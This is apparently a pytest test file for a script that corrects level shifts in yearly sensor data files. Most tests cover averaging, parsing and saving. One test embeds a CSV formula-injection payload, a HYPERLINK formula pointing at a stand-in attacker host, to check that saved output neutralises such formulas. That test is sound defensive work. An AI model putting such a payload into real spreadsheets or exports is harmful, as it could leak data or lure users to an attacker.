import csv

import numpy as np
import pandas as pd
import pytest

from scripts.apply_refined_corrections import (
    apply_level_shift_correction,
    calculate_non_zero_average,
    load_identified_outliers,
    output_file_name,
    parse_sensor_index,
    parse_year_pair,
    save_corrected_files,
)


def test_calculate_non_zero_average_basic():
    """Test with basic numeric values."""
    series = pd.Series([1.0, 2.0, 3.0])
    assert calculate_non_zero_average(series) == 2.0


def test_calculate_non_zero_average_with_zeros():
    """Test with zeros included."""
    series = pd.Series([1.0, 0.0, 3.0, 0.0])
    assert calculate_non_zero_average(series) == 2.0


def test_calculate_non_zero_average_with_nans():
    """Test with NaNs included."""
    series = pd.Series([1.0, np.nan, 3.0])
    assert calculate_non_zero_average(series) == 2.0


def test_calculate_non_zero_average_mixed_zeros_nans():
    """Test with both zeros and NaNs."""
    series = pd.Series([1.0, 0.0, np.nan, 3.0])
    assert calculate_non_zero_average(series) == 2.0


def test_calculate_non_zero_average_all_zeros():
    """Test with all zero values."""
    series = pd.Series([0.0, 0.0, 0.0])
    assert calculate_non_zero_average(series) == 0.0


def test_calculate_non_zero_average_empty():
    """Test with an empty series."""
    series = pd.Series([], dtype=float)
    assert calculate_non_zero_average(series) == 0.0


def test_calculate_non_zero_average_all_nans():
    """Test with all NaN values."""
    series = pd.Series([np.nan, np.nan])
    assert calculate_non_zero_average(series) == 0.0


def test_calculate_non_zero_average_numeric_strings():
    """Test with numeric strings that need coercion."""
    series = pd.Series(["1", "2", "3"])
    assert calculate_non_zero_average(series) == 2.0


def test_calculate_non_zero_average_non_numeric_strings():
    """Test with non-numeric strings that coerce to NaN."""
    series = pd.Series(["a", "b"])
    assert calculate_non_zero_average(series) == 0.0


def test_calculate_non_zero_average_mixed_strings():
    """Test with mixed numeric and unparseable strings."""
    series = pd.Series(["1", "a", "3"])
    assert calculate_non_zero_average(series) == 2.0


def test_multiple_corrections_to_same_file_are_preserved(tmp_path):
    """Test that corrections sharing an output file are written together."""
    previous_file = str(tmp_path / "S26_Y01.txt")
    next_file = str(tmp_path / "S26_Y02.txt")
    raw_file_map = {"S26": {1: previous_file, 2: next_file}}
    raw_dataframes = {
        previous_file: pd.DataFrame(
            {
                0: [10, 10, 10, 10, 10],
                1: [20, 20, 20, 20, 20],
            }
        ),
        next_file: pd.DataFrame(
            {
                0: [1, 1, 1, 1, 1],
                1: [2, 2, 2, 2, 2],
            }
        ),
    }
    outliers = [
        pd.Series(
            {
                "Year_Pair": "1995 (Y01) to 1996 (Y02)",
                "Sensor": "Sensor 01",
                "Difference": 0.9,
            }
        ),
        pd.Series(
            {
                "Year_Pair": "1995 (Y01) to 1996 (Y02)",
                "Sensor": "Sensor 02",
                "Difference": 1.8,
            }
        ),
    ]

    corrections = [
        apply_level_shift_correction(
            (outlier.Year_Pair, outlier.Sensor, outlier.Difference),
            raw_file_map,
            raw_dataframes,
        )
        for outlier in outliers
    ]
    save_corrected_files(corrections, raw_file_map, raw_dataframes, tmp_path)

    corrected = pd.read_csv(tmp_path / "S26_Y02_refined_corrected.csv", header=None)
    assert corrected[0].tolist() == [10, 10, 10, 10, 10]
    assert corrected[1].tolist() == [20, 20, 20, 20, 20]


def test_load_identified_outliers_file_not_found(capsys):
    """Test that a missing file returns an empty DataFrame and prints an error."""
    df = load_identified_outliers("non_existent_file.csv")
    assert df.empty

    captured = capsys.readouterr()
    assert "Error: The file 'non_existent_file.csv' was not found." in captured.out


@pytest.mark.parametrize(
    "test_case",
    [
        (
            {"Year_Pair": ["1995 (Y01) to 1996 (Y02)"], "Other_Col": [1.0]},
            "Error: No sensor columns found in",
        ),
        (
            {"Sensor 01": [1.0], "Sensor 02": [2.0]},
            "Error: 'Year_Pair' column not found in",
        ),
    ],
)
def test_load_identified_outliers_missing_columns(tmp_path, capsys, test_case):
    """Test that a CSV with missing required columns returns an empty DataFrame."""
    data, expected_error_fragment = test_case
    csv_file = tmp_path / "test_data.csv"
    pd.DataFrame(data).to_csv(csv_file, index=False)

    df = load_identified_outliers(str(csv_file))
    assert df.empty

    captured = capsys.readouterr()
    assert f"{expected_error_fragment} {csv_file}." in captured.out


def test_calculate_non_zero_average_booleans():
    """Test with boolean values (True coerced to 1, False to 0)."""
    series = pd.Series([True, False, True])
    assert calculate_non_zero_average(series) == 1.0


def test_calculate_non_zero_average_inf():
    # mean of [inf, -inf, 1.0] gives NaN and triggers RuntimeWarning,
    # let's just test with a single inf and 1.0 to get inf.
    series = pd.Series([np.inf, 1.0])
    assert np.isinf(calculate_non_zero_average(series))


def test_calculate_non_zero_average_whitespace():
    """Test with whitespace strings which become NaN."""
    series = pd.Series(["", " ", "1.0"])
    assert calculate_non_zero_average(series) == 1.0


def test_calculate_non_zero_average_complex_objects():
    """Test with uncoercible complex objects."""
    series = pd.Series([[1], {"a": 1}, 2.0])
    assert calculate_non_zero_average(series) == 2.0


def test_save_corrected_files_escapes_malicious_cells(tmp_path):
    """CSV output from save_corrected_files must neutralize formula payloads."""
    raw_file = str(tmp_path / "S26_Y01.txt")
    payload = '=HYPERLINK("http://attacker.example/collect","click")'
    raw_dataframes = {raw_file: pd.DataFrame({0: [1, 2], 1: [payload, "safe"]})}
    applied_corrections = [{"File_Corrected": output_file_name(raw_file)}]
    raw_file_map = {"S26": {1: raw_file}}

    save_corrected_files(applied_corrections, raw_file_map, raw_dataframes, tmp_path)

    out_file = tmp_path / output_file_name(raw_file)
    with open(out_file, newline="") as f:
        rows = list(csv.reader(f))

    assert len(rows) == 2
    assert len(rows[0]) == 2
    assert rows[0][1] == "'" + payload
    assert rows[1][1] == "safe"


def test_parse_sensor_index_valid():
    """Test parse_sensor_index with valid sensor names."""
    assert parse_sensor_index("Sensor 1") == 0
    assert parse_sensor_index("Sensor 32") == 31
    assert parse_sensor_index("Sensor 16") == 15


def test_parse_sensor_index_invalid_format():
    """Test parse_sensor_index with invalid sensor name format (triggers ValueError)."""
    assert parse_sensor_index("Sensor A") is None
    assert parse_sensor_index("Invalid 1") is None
    assert parse_sensor_index("Sensor") is None
    assert parse_sensor_index("Sensor1") is None


def test_parse_sensor_index_out_of_bounds():
    """Test parse_sensor_index with out-of-bounds sensor numbers."""
    assert parse_sensor_index("Sensor 0") is None
    assert parse_sensor_index("Sensor 33") is None
    assert parse_sensor_index("Sensor -1") is None



def test_parse_year_pair_valid_forward():
    assert parse_year_pair("1995 (Y01) to 1996 (Y02)") == (1, 2)


def test_parse_year_pair_valid_reverse():
    assert parse_year_pair("1996 (Y02) to 1995 (Y01)") == (1, 2)


def test_parse_year_pair_invalid_format():
    assert parse_year_pair("1995 to 1996") is None


def test_parse_year_pair_empty():
    assert parse_year_pair("") is None
